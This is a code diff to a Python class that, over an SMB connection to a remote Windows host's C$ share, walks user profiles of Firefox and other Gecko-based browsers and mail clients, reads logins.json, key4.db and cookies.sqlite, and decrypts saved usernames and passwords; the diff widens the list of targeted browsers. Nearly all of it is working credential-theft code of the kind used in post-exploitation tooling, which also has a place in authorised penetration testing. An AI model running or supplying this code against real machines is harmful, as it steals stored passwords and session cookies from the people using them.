@@ -50,6 +50,14 @@ class FirefoxTriage:
     """
 
     firefox_generic_path = "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
+    gecko_paths = {"Firefox": "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
+                   "Thunderbird": "Users\\{}\\AppData\\Roaming\\Thunderbird\\Profiles",
+                   "Waterfox": "Users\\{}\\AppData\\Roaming\\Waterfox\\Profiles",
+                   "K-Meleon": "Users\\{}\\AppData\\Roaming\\K-Meleon\\Profiles",
+                   "IceDragon": "Users\\{}\\AppData\\Roaming\\Comodo\\IceDragon\\Profiles",
+                   "Cyberfox": "Users\\{}\\AppData\\Roaming\\8pecxstudios\\Cyberfox\\Profiles",
+                   "BlackHaw": "Users\\{}\\AppData\\Roaming\\NETGATE Technologies\\BlackHaw\\Profiles",
+                   "Pale Moon": "Users\\{}\\AppData\\Roaming\\Moonchild Productions\\Pale Moon\\Profiles"}
     share = "C$"
     false_positive = (
         ".",
@@ -76,73 +84,75 @@ class FirefoxTriage:
         firefox_cookies = []
         # list users
         users = self.get_users()
-        for user in users:
-            try:
-                directories = self.conn.remote_list_dir(share=self.share, path=self.firefox_generic_path.format(user))
-            except Exception as e:
-                if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
-                    continue
-                self.logger.debug(e)
-            if directories is None:
-                continue
-            for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
+        for browser, path in self.gecko_paths.items():
+            self.logger.debug(f"Gather {browser}")
+            for user in users:
                 try:
-                    if gather_cookies:
-                        cookies_path = ntpath.join(self.firefox_generic_path.format(user), d.get_longname(), "cookies.sqlite")
-                        cookies_data = self.conn.readFile(self.share, cookies_path)
-                        if cookies_data is not None:
-                            firefox_cookies += self.parse_cookie_data(user, cookies_data)
-                    logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
-                    logins_data = self.conn.readFile(self.share, logins_path)
-                    if logins_data is None:
-                        continue  # No logins.json file found
-                    logins = self.get_login_data(logins_data=logins_data)
-                    if len(logins) == 0:
-                        continue  # No logins profile found
-                    key4_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\key4.db"
-                    key4_data = self.conn.readFile(self.share, key4_path)
-                    if key4_data is None:
-                        continue
-                    # Get all available master keys (Firefox 144+ may have multiple keys)
-                    keys = self.get_all_keys(key4_data=key4_data)
-                    if len(keys) == 0 and self.target.password != "":
-                        keys = self.get_all_keys(
-                            key4_data=key4_data,
-                            master_password=self.target.password.encode(),
-                        )
-                    if len(keys) == 0:
-                        continue
-
-                    for username, pwd, host in logins:
-                        decoded_username = None
-                        password = None
-
-                        for key in keys:
-                            try:
-                                decrypted_username = self.decrypt(key=key, iv=username[1], ciphertext=username[2])
-                                decoded_username = decrypted_username.decode("utf-8")
-
-                                decrypted_password = self.decrypt(key=key, iv=pwd[1], ciphertext=pwd[2])
-                                password = decrypted_password.decode("utf-8")
-
-                                break  # Success - stop trying other keys
-                            except (UnicodeDecodeError, Exception):
-                                continue
-
-                        if password is not None and decoded_username is not None:
-                            data = FirefoxData(
-                                winuser=user,
-                                url=host,
-                                username=decoded_username,
-                                password=password,
-                            )
-                            if self.per_secret_callback is not None:
-                                self.per_secret_callback(data)
-                            firefox_data.append(data)
+                    directories = self.conn.remote_list_dir(share=self.share, path=path.format(user))
                 except Exception as e:
                     if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                         continue
-                    self.logger.exception(e)
+                    self.logger.debug(e)
+                if directories is None:
+                    continue
+                for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
+                    try:
+                        if gather_cookies:
+                            cookies_path = ntpath.join(path.format(user), d.get_longname(), "cookies.sqlite")
+                            cookies_data = self.conn.readFile(self.share, cookies_path)
+                            if cookies_data is not None:
+                                firefox_cookies += self.parse_cookie_data(user, cookies_data)
+                        logins_path = path.format(user) + "\\" + d.get_longname() + "\\logins.json"
+                        logins_data = self.conn.readFile(self.share, logins_path)
+                        if logins_data is None:
+                            continue  # No logins.json file found
+                        logins = self.get_login_data(logins_data=logins_data)
+                        if len(logins) == 0:
+                            continue  # No logins profile found
+                        key4_path = path.format(user) + "\\" + d.get_longname() + "\\key4.db"
+                        key4_data = self.conn.readFile(self.share, key4_path)
+                        if key4_data is None:
+                            continue
+                        # Get all available master keys (Firefox 144+ may have multiple keys)
+                        keys = self.get_all_keys(key4_data=key4_data)
+                        if len(keys) == 0 and self.target.password != "":
+                            keys = self.get_all_keys(
+                                key4_data=key4_data,
+                                master_password=self.target.password.encode(),
+                            )
+                        if len(keys) == 0:
+                            continue
+
+                        for username, pwd, host in logins:
+                            decoded_username = None
+                            password = None
+
+                            for key in keys:
+                                try:
+                                    decrypted_username = self.decrypt(key=key, iv=username[1], ciphertext=username[2])
+                                    decoded_username = decrypted_username.decode("utf-8")
+
+                                    decrypted_password = self.decrypt(key=key, iv=pwd[1], ciphertext=pwd[2])
+                                    password = decrypted_password.decode("utf-8")
+
+                                    break  # Success - stop trying other keys
+                                except (UnicodeDecodeError, Exception):
+                                    continue
+
+                            if password is not None and decoded_username is not None:
+                                data = FirefoxData(
+                                    winuser=user,
+                                    url=host,
+                                    username=decoded_username,
+                                    password=password,
+                                )
+                                if self.per_secret_callback is not None:
+                                    self.per_secret_callback(data)
+                                firefox_data.append(data)
+                    except Exception as e:
+                        if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
+                            continue
+                        self.logger.exception(e)
         return firefox_data
 
     def parse_cookie_data(self, windows_user, cookies_data):
